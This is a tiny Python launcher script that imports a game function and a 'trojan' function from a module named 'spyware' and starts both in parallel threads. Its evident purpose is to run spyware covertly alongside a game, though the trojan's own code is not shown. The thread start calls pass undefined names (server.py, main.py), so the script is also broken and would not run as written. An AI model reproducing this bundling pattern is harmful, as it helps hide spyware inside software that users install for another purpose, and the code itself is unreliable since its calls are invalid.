from game import game
from spyware import trojan
import threading

t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start(server.py)
t2.start(main.py)
